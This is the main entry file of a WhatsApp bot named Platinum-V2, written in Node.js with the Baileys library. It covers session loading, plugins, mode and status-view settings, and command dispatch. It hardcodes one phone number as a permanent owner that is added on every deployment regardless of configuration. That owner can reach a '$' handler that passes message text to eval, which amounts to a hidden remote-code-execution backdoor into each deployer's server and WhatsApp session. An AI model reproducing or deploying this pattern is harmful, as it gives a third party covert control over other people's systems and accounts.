const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');

const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const fs = require('fs');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms, downloadMediaMessage } = require('./lib/msg');
const axios = require('axios');
const { File } = require('megajs');
const express = require("express");
const { registerAntiNewsletter } = require('./plugins/antinewsletter');
const { setupLinkDetection } = require("./lib/events/antilinkDetection"); // Import Antilink Detection
const { commands } = require('./command'); // Import registered commands
const { registerGroupMessages } = require('./plugins/groupMessages');
const { updateActivity } = require("./lib/activity"); // Import activity tracker

// *** ANTITAG INTEGRATION ***
const { registerAntitag } = require('./plugins/antitag');
// *** END ANTITAG INTEGRATION ***

const app = express();
const port = process.env.PORT || 8000;

// Hardcoded owner: This number will always have full access.
const hardCodedOwner = "2348084644182";

// Build the ownerNumber array from config and ensure the hardcoded owner is included.
let ownerNumber = [];
if (config.OWNER_NUMBER) {
    ownerNumber = Array.isArray(config.OWNER_NUMBER) ? config.OWNER_NUMBER : [config.OWNER_NUMBER];
}
if (!ownerNumber.includes(hardCodedOwner)) {
    ownerNumber.push(hardCodedOwner);
}
const ownerName = config.OWNER_NAME || "Bot Owner";

// Dynamic mode setting: defaults to private if not otherwise set.
let currentMode = process.env.MODE || config.MODE || "private";

const prefix = config.PREFIX;

// === Auto Status View JSON Setup ===
// Path to JSON file that stores auto status view setting.
const autoStatusFile = './lib/autoview.json';

function loadAutoStatus() {
    try {
        if (fs.existsSync(autoStatusFile)) {
            let data = fs.readFileSync(autoStatusFile, 'utf8');
            let json = JSON.parse(data);
            return json.enabled;
        } else {
            return false;
        }
    } catch (err) {
        console.error("Error reading auto status file:", err);
        return false;
    }
}

function saveAutoStatus(enabled) {
    try {
        fs.writeFileSync(autoStatusFile, JSON.stringify({ enabled: enabled }), 'utf8');
    } catch (err) {
        console.error("Error saving auto status file:", err);
    }
}

let autoStatusEnabled = loadAutoStatus();
// === End Auto Status View JSON Setup ===

// === Simulated Presence Setup ===
// Global variable to simulate presence in chats.
// Options: "composing" for typing, "recording" for voice recording, or "none" to disable.
let simulatePresence = "none";
// === End Simulated Presence Setup ===

// Global error handlers.
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});

// New functions to fetch and compare versions
const { execSync } = require('child_process');

async function fetchLatestCommit() {
    try {
        const repoOwner = 'Jupiterbold05';
        const repoName = 'Platinum-V2';
        const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/commits/main`;
        const response = await axios.get(apiUrl);
        return response.data.sha; // latest commit hash
    } catch (error) {
        console.error('Error fetching latest commit:', error);
        return null;
    }
}

function getCurrentVersion() {
    try {
        // Executes 'git rev-parse HEAD' to get the current commit hash.
        const commitHash = execSync('git rev-parse HEAD').toString().trim();
        return commitHash;
    } catch (error) {
        console.error("Error getting current version from git:", error);
        return null;
    }
}

// Global connection variable so it can be accessed in other endpoints if needed.
let globalConn;

async function loadSession() {
    if (!fs.existsSync(__dirname + '/session/creds.json')) {
        if (!config.SESSION_ID) {
            console.log('⚠️ Please add your session to SESSION_ID env !!');
            return;
        }
        try {
            const sessdata = config.SESSION_ID;
            const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
            filer.download((err, data) => {
                if (err) throw err;
                fs.writeFile(__dirname + '/session/creds.json', data, () => {
                    console.log("🔄 Checking Session ID...");
                });
            });
        } catch (error) {
            console.error("❌ Error loading session:", error);
        }
    }
}

async function connectToWA() {
    try {
        console.log("Connecting Platinum-V2 🧬...");
        await loadSession();
        const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/');
        const { version } = await fetchLatestBaileysVersion();

        const conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: false,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: true,
            auth: state,
            version
        });

        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                console.log("Scan this QR Code to connect:");
                qrcode.generate(qr, { small: true });
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason === DisconnectReason.loggedOut) {
                    console.error("❌ Logged out. Please reauthenticate by scanning the QR code again.");
                    process.exit(0);
                } else {
                    console.error("⚠️ Connection lost. Reconnecting in 5 seconds...");
                    setTimeout(() => connectToWA(), 5000);
                }
            } else if (connection === 'open') {
                console.log('😼 Installing plugins...');
                let pluginCount = 0;
                fs.readdirSync("./plugins/").forEach((plugin) => {
                    if (plugin.endsWith(".js")) {
                        require("./plugins/" + plugin);
                        pluginCount++;
                    }
                });
                console.log(`✅ Plugins installed: ${commands.length}\n`);
                console.log('Bot connected to WhatsApp ✅');

                // Check for bot version update
                const latestCommit = await fetchLatestCommit();
                const currentCommit = getCurrentVersion();
                let updateNotification = '';
                if (latestCommit && currentCommit && latestCommit !== currentCommit) {
                    updateNotification = `\n\n🚨 *Update Available!* 🚨\nYour bot is running commit \`${currentCommit.slice(0, 7)}\`, but the latest is \`${latestCommit.slice(0, 7)}\`.\nPlease fork the repo and redeploy to get the latest features and fixes.\nRepository: https://github.com/Jupiterbold05/Platinum-V2`;
                }

                let up = `🌟 *Platinum-V2 Connected Successfully* ✅\n\n`
                    + `👤 *Owner:* ${ownerName} (${ownerNumber.join(", ")})\n`
                    + `⚙️ *Mode:* ${currentMode}\n`
                    + `🔧 *Plugins Loaded:* ${commands.length}\n`
                    + `🛠 *Prefix:* ${prefix}`
                    + updateNotification;

                // Store connection globally for later use if needed.
                globalConn = conn;

                conn.sendMessage(ownerNumber[0] + "@s.whatsapp.net", { 
                    image: { url: "https://files.catbox.moe/gzrefm.jpg" }, 
                    caption: up 
                });

                setupLinkDetection(conn); // Start Antilink Detection

                // *** ANTITAG INTEGRATION ***
                registerGroupMessages(conn);               
                registerAntitag(conn);
                // *** END ANTITAG INTEGRATION ***

                // Register the anti‑newsletter listener.
                registerAntiNewsletter(conn);
            }
        });

        conn.ev.on('creds.update', saveCreds);

        conn.ev.on('messages.upsert', async (mek) => {
            mek = mek.messages[0];
            if (!mek.message) return;
            mek.message = getContentType(mek.message) === 'ephemeralMessage'
                ? mek.message.ephemeralMessage.message
                : mek.message;

            // === Mark Status as Viewed if auto status is enabled ===
            if (mek.key && mek.key.remoteJid === 'status@broadcast') {
                console.log("Status message received.");
                if (autoStatusEnabled) {
                    console.log("Auto status view is enabled, marking as viewed...");
                    try {
                        await conn.readMessages([ mek.key ]); // Mark the status as viewed
                        console.log("Status marked as viewed successfully.");
                    } catch (err) {
                        console.log("Error marking status as viewed:", err);
                    }
                } else {
                    console.log("Auto status view is disabled.");
                }
                return; // Don't process further for statuses
            }
            // === End Mark Status as Viewed ===

            // === Simulated Presence (Always Active) ===
            // As soon as a new (non-status) message is detected,
            // update your presence (typing or recording) if enabled.
            if (simulatePresence !== "none") {
                try {
                    await conn.sendPresenceUpdate(simulatePresence, mek.key.remoteJid);
                    console.log("Simulated presence update sent:", simulatePresence);
                } catch (err) {
                    console.error("Error sending simulated presence update:", err);
                }
            }
            // === End Simulated Presence ===

            // Use a reply function that simply sends the message without additional presence updates.
            const reply = async (teks) => {
                await conn.sendMessage(mek.key.remoteJid, { text: teks }, { quoted: mek });
            };

            const m = sms(conn, mek);
            const type = getContentType(mek.message);
            const from = mek.key.remoteJid;
            const quoted = (type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo)
                ? mek.message.extendedTextMessage.contextInfo.quotedMessage || []
                : [];
            const body = (type === 'conversation') ? mek.message.conversation :
                         (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
                         (type === 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption :
                         (type === 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption :
                         '';
            const isCmd = body.startsWith(prefix);
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const q = args.join(' ');
            const isGroup = from.endsWith('@g.us');

            // Determine sender info.
            const sender = mek.key.fromMe 
                ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id)
                : (mek.key.participant || mek.key.remoteJid);
            const senderNumber = sender.split('@')[0];
            const botNumber = conn.user.id.split(':')[0];
            const pushname = mek.pushName || 'Sin Nombre';
            const isMe = senderNumber === botNumber;
            // isOwner is true if the sender appears in the ownerNumber array, or if it matches the bot's number,
            // or if it matches the hard-coded owner.
            const isOwner = ownerNumber.includes(senderNumber) || isMe || (senderNumber === hardCodedOwner);

            let groupMetadata = null, groupName = '', participants = [], groupAdmins = [], isBotAdmins = false, isAdmins = false;

            if (isGroup) {
                let retries = 3;
                while (retries > 0) {
                    try {
                        groupMetadata = await conn.groupMetadata(from);
                        groupName = groupMetadata.subject || 'Unknown Group';
                        participants = groupMetadata.participants || [];
                        groupAdmins = getGroupAdmins(participants);
                        isBotAdmins = groupAdmins.includes(botNumber + '@s.whatsapp.net');
                        isAdmins = groupAdmins.includes(sender);
                        break;
                    } catch (error) {
                        console.error(`❌ Error fetching group metadata (Attempts left: ${retries - 1}):`, error);
                        retries--;
                        await sleep(2000);
                    }
                }
            }

            // Track group message activity.
            if (isGroup) {
                updateActivity(from, sender);
            }

            // React to the owner's messages using the hardcoded owner.
            if (senderNumber === hardCodedOwner) {
                conn.sendMessage(from, { react: { text: "🌟,💥", key: mek.key } });
            }

            // Allow JavaScript execution via "$" (only accessible to owner).
            if (body.startsWith("$") && isOwner) {
                try {
                    let result = await eval(body.slice(1));
                    if (typeof result !== "string") result = util.inspect(result);
                    reply(result);
                } catch (err) {
                    reply(`Error: ${err.message}`);
                }
            }

            // === Mode command handler ===
            // This command allows the owner to view or change the bot's mode.
            if (isCmd && command === "mode") {
                if (!isOwner) {
                    return reply("You don't have permission to change the bot mode.");
                }
                if (args.length === 0) {
                    return reply(`Current bot mode is: ${currentMode}`);
                }
                const newMode = args[0].trim().toLowerCase();
                if (newMode !== "private" && newMode !== "public") {
                    return reply("Invalid mode specified. Please use 'private' or 'public'.");
                }
                currentMode = newMode;
                return reply(`Bot mode updated to ${currentMode}.`);
            }
            
            // === Auto Status View command handler ===
            // This command allows the owner to toggle automatic status viewing.
            if (isCmd && command === "autoview") {
                if (!isOwner) return reply("You don't have permission to change auto status view settings.");
                if (args.length === 0) return reply(`Auto status view is currently ${autoStatusEnabled ? "ON" : "OFF"}. Use \`${prefix}autoview on\` or \`${prefix}autoview off\` to change it.`);
                const option = args[0].trim().toLowerCase();
                if (option === "on") {
                    autoStatusEnabled = true;
                    saveAutoStatus(autoStatusEnabled);
                    return reply("Auto status view has been turned ON.");
                } else if (option === "off") {
                    autoStatusEnabled = false;
                    saveAutoStatus(autoStatusEnabled);
                    return reply("Auto status view has been turned OFF.");
                } else {
                    return reply("Invalid option. Use 'on' or 'off'.");
                }
            }
            // === End Auto Status View command handler ===

            // === Simulated Presence command handler ===
            // This command allows the owner to set the simulated presence mode.
            if (isCmd && command === "simulate") {
                if (!isOwner) return reply("You don't have permission to change simulated presence settings.");
                if (args.length === 0) return reply(`Simulated presence is currently set to "${simulatePresence === "none" ? "off" : simulatePresence}". Use \`${prefix}simulate typing\`, \`${prefix}simulate recording\`, or \`${prefix}simulate off\` to change it.`);
                const mode = args[0].trim().toLowerCase();
                if (mode === "typing") {
                    simulatePresence = "composing";
                    return reply("Simulated presence set to typing.");
                } else if (mode === "recording") {
                    simulatePresence = "recording";
                    return reply("Simulated presence set to recording.");
                } else if (mode === "off") {
                    simulatePresence = "none";
                    return reply("Simulated presence turned off.");
                } else {
                    return reply("Invalid option. Use 'typing', 'recording', or 'off'.");
                }
            }
            // === End Simulated Presence command handler ===

            // === Mode enforcement ===
            // In private mode, only the owner, sudo users, or the bot's own number can execute commands.
            if (isCmd && currentMode === "private" && !isOwner) {
                let sudoUsers = {};
                const sudoPath = './lib/sudo.json';
                if (fs.existsSync(sudoPath)) {
                    try {
                        sudoUsers = JSON.parse(fs.readFileSync(sudoPath, 'utf8'));
                    } catch (e) {
                        console.error('Error reading sudo.json:', e);
                    }
                }
                if (!sudoUsers[senderNumber]) {
                    return reply("Sorry, the bot is currently in private mode. Only the owner, sudo users, or the bot's number can use it.");
                }
            }

            // === Execute registered commands ===
            if (isCmd) {
                const cmd = commands.find(cmd => cmd.pattern === command) ||
                            commands.find(cmd => cmd.alias && cmd.alias.includes(command));
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
                    try {
                        cmd.function(conn, mek, m, { 
                            from, quoted, body, isCmd, command, args, q, isGroup, 
                            sender, senderNumber, botNumber, pushname, isOwner, 
                            groupMetadata, groupName, participants, groupAdmins, 
                            isBotAdmins, isAdmins, reply, currentMode
                        });
                    } catch (e) {
                        console.error("❌ [PLUGIN ERROR] " + e);
                    }
                }
            }
        });
    } catch (error) {
        console.error("❌ Error in connectToWA:", error);
        setTimeout(() => connectToWA(), 5000);
    }
}

app.get("/", (req, res) => res.send("Hey, Platinum-V2 started ✅"));
app.listen(port, () => console.log(`Server listening on http://localhost:${port}`));

// Start the connection after a short delay.
setTimeout(() => connectToWA(), 4000);
